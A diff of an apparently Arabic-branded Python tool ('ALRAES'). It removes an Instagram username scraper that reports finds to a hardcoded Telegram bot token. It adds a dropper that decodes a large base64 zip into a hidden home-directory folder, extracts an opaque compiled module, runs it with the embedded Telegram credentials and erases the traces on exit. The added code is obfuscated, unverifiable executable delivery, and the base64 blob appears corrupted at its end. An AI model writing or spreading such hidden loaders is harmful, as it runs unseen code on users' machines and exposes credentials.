@@ -1,103 +1,68 @@
-import webbrowser
-webbrowser.open('https://t.me/M_A_M_ll')
-import os,sys,subprocess,webbrowser 
-subprocess.getoutput("pip install mechanize")
-import requests,sys,os,time
-import pyfiglet
-import requests 
-import random 
-Z = '\033[1;31m' #احمر
-X = '\033[1;33m' #اصفر
-Z1 = '\033[2;31m' #احمر ثاني
-F = '\033[1;32m' #اخضر
-A = '\033[2;34m'#ازرق
-C = '\033[2;35m' #وردي
-B = '\033[2;36m'#سمائي
-Y = '\033[1;34m' #ازرق فاتح
-insta="_qwertyuiopasdfghjklzxcvbnm1234567890"
-ajw="_."
-#------------------colors---------------#
-B="\033[1;30m" # Black
-R="\033[1;31m" # Red
-G="\033[1;32m" # Green
-Y="\033[1;33m" # Yellow
-Bl="\033[1;34m" # Blue
-P="\033[1;35m" # Purple
-C="\033[1;36m" # Cyan
-W="\033[1;37m" # White
-E = "\033[0;90m" #رمادي
-#------------------logo---------------------#
-print(f'''\033[2;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-ALRAES Tools
-	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-MMMMMMMM               MMMMMMMM
-M:::::::M             M:::::::M
-M::::::::M           M::::::::M
-M:::::::::M         M:::::::::M
-M::::::::::M       M::::::::::M
-M:::::::::::M     M:::::::::::M
-M:::::::M::::M   M::::M:::::::M
-M::::::M M::::M M::::M M::::::M
-M::::::M  M::::M::::M  M::::::M
-M::::::M   M:::::::M   M::::::M
-M::::::M    M:::::M    M::::::M
-M::::::M     MMMMM     M::::::M
-M::::::M               M::::::M
-M::::::M               M::::::M
-M::::::M               M::::::M
-MMMMMMMM               MMMMMMMM		
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mMY NAME     : ALRAES 👑
-  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mTELEGRAM    : @M_A_M_ll
-  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mTOOL        : ALRAES ¦¦ 𝗣𝗬𝗧𝗛𝗢𝗡 المدفوعة 
-  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mTELEGRAM    : @CC8CD
-\033[2;35m\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
-#------------------------- logo ---------------------------#
-id = "7540870238"
-token = "8895448772:AAGPdfN1mqV1UcMnRBxmC0Z3DZbk8UUtztw"
+import os
+import shutil
+import zipfile
+import subprocess
+import base64
+import atexit
+import sys
 
-def instaa(user):
-    
-    url_check = f'https://www.instagram.com/{user}/'
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-    }
+# Hardcoded Telegram credentials
+TELEGRAM_ID = "7540870238"
+TELEGRAM_TOKEN = "8895448772:AAGPdfN1mqV1UcMnRBxmC0Z3DZbk8UUtztw"
+
+MyHome = os.path.expanduser("~")
+Pyprivate = os.path.join(MyHome, ".pyprivate")
+
+def cleanup():
+    if os.path.exists(Pyprivate):
+        try:
+            shutil.rmtree(Pyprivate, ignore_errors=True)
+        except:
+            pass
+
+atexit.register(cleanup)
+
+# The base64 encoded payload
+ALRAES = "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益"
+Dev = base64.b64decode(ALRAES)
+
+if not os.path.exists(Pyprivate):
+    os.makedirs(Pyprivate, exist_ok=True)
+
+Mahos = os.path.join(Pyprivate, "CanYou")
+with open(Mahos, "wb") as f:
+    f.write(Dev)
+
+with zipfile.ZipFile(Mahos, 'r') as zip_ref:
+    zip_ref.extractall(Pyprivate)
+
+alraes_path = os.path.join(Pyprivate, "Alraes.so")
+if os.path.exists(alraes_path):
     try:
-        response = requests.get(url_check, headers=headers, timeout=10)
-        if response.status_code == 404:
-            
-            email=0
-            print(W+f" » {C} Hit user ~> {F}{user} ")
-            email+=1
-            god=f"""𖤍 اب نيو الريس جابلك يوزر تفضل  𖤍▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭
-        ALRAES <•••> @{user}
-        ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭  
-        Tele ~> @M_A_M_ll <•••> @CC8CD"""
-            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={god}')
-        else:
-            
-            print(W+f" »{F} Not user ~> {C}{user} ")
-    except Exception as e:
-        
-        print(W+f" » {Z} Error checking » {A}{user} ")
+        os.chmod(alraes_path, 0o755)
+    except:
+        pass
 
-def users():
-    ran1="1234567890qwertyuiopasdfghjklzxvcbnm"
-    while True:
-        v1 = str(''.join((random.choice(insta) for i in range(1))))
-        v2 = str(''.join((random.choice(ajw) for i in range(1))))
-        v3 = str(''.join((random.choice(insta) for i in range(1))))
-        v4 = str(''.join((random.choice(ajw) for i in range(1))))
-        v5 = str(''.join((random.choice(insta) for i in range(1))))
-        user1 = (v5+v1+v2+v3+v4)
-        user2 = (v1+v5+v2+v3+v4)
-        user3 = (v1+v2+v5+v3+v4)
-        user4 = (v1+v2+v3+v4+v5)
-        ajwad= (user1, user2, user3 ,user4)
-        user = random.choice(ajwad)
-        instaa(user)
+Do_Not = os.path.join(Pyprivate, "__main__.py")
+try:
+    # Use subprocess.Popen to interact with the process and provide inputs
+    process = subprocess.Popen(
+        [sys.executable, Do_Not],
+        cwd=Pyprivate,
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True
+    )
     
-        time.sleep(0.5)
-users()
+    # Provide the hardcoded credentials automatically
+    inputs = f"{TELEGRAM_ID}\n{TELEGRAM_TOKEN}\n"
+    stdout, stderr = process.communicate(input=inputs)
+    print(stdout)
+    if stderr:
+        print(f"\n[!] Error: {stderr}")
+
+except Exception as e:
+    print(f"\n[!] Runtime Error: {e}")
+finally:
+    cleanup()
